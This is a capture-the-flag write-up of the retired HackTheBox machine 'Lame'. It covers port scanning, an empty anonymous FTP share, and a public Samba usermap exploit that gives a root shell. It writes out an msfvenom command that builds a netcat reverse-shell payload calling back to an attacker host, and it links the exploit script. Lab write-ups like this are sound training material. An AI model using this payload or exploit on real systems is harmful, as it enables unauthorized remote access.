---
title: Lame Hackthebox Writeup
date: 2020-12-24 09:00:00 +0800
categories: [Hackthebox, Retired]
tags: [linux,ftp,vsftpc,samba exploit,ftp anonymous login]     # TAG names should always be lowercase
image: /assets/img/lame-hackthebox/lame-pic.png
subtitle: JHBDOcubeoveiubo
---


# Introduction@Lame:~$


Column | Details
------------ | -------------
Name | Lame
IP | 10.10.10.3
Points | 20
Os | Linux
Difficult | Easy
Creator | [ch4p](https://www.hackthebox.eu/home/users/profile/1)
Out on | 26th May 2017

# Summary:~$

* Discovering the new host and scanning for open ports.
* `Anonymous ftp` is allowed, but of no use.
* Found `samba exploit` for the version running on the machine.
* Got Root directly.

# Starting:~$

## Nmap

I have used **nmapAutomator** , which keeps the scanning fast and reduces effort.*(Not recommended in real life scenarios).* 

Dowload link: [nmapAutomator](https://github.com/21y4d/nmapAutomator)

___
![](/assets/img/lame-hackthebox/nmap-scan-1.png)

From a `quick scan` we know that `4 Ports` are open i.e. `21,22,139,445`. Let's access port 21 `ftp` for anonymous logins.

___
![](/assets/img/lame-hackthebox/ftp-login-2.png)

But it's of no use as the directories are `empty`.

I googled a bit about the `smb` version running and found this [exploit](https://gist.githubusercontent.com/joenorton8014/19aaa00e0088738fc429cff2669b9851/raw/6e1ae37e0061be103fd733b16266d26379a7f4ba/samba-usermap-exploit.py)

Making changes in the *exploit* by replacing it with our `msfvenom payload`.

**msfvenom command** : *msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.X.X LPORT=9999 -f python*

___
![](/assets/img/lame-hackthebox/changing the payload-4.png)

This is what the final exploit looks like: (*changing the payload with our payload*)

___
![](/assets/img/lame-hackthebox/my-final-exploit-6.png)

Running the exploit and listeing on specified port using `nc`, we got the `Root shell`.

___
![](/assets/img/lame-hackthebox/got-root-shell-7.png)

